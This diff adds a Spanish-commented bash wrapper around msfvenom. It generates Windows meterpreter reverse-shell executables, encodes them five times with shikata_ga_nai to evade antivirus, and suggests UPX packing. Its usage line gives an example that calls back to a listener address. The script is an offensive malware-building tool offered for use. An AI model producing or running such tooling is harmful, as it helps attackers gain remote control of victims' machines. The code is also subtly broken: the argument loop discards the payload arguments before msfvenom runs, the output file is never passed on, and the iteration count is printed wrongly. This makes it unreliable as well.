@@ -1,0 +1,31 @@
+#!/usr/bin/env bash
+# msfvenom-plus: wrapper con ofuscacion automatica
+set -e
+
+if [[ $# -lt 4 ]]; then
+    echo "Uso: msfvenom-plus -p PAYLOAD LHOST=ip LPORT=port -o output.exe"
+    echo "Ej:  msfvenom-plus -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.exe"
+    exit 1
+fi
+
+OUTPUT=""
+ENCODERS=(-e x86/shikata_ga_nai -i 5)
+
+for arg; do
+    if [[ "$arg" == "-o" ]]; then
+        shift
+        OUTPUT="$1"
+        break
+    fi
+    shift
+done
+
+if [[ -z "$OUTPUT" ]]; then
+    echo "Falta -o <output>"
+    exit 1
+fi
+
+echo "[+] Generando payload ofuscado..."
+echo "[+] Encoder: ${ENCODERS[1]} | Iteraciones: ${ENCODERS[2]}"
+msfvenom "$@" "${ENCODERS[@]}" -f exe --platform windows -a x86
+echo "[+] Listo. Comprimir con: upx -9 $OUTPUT"
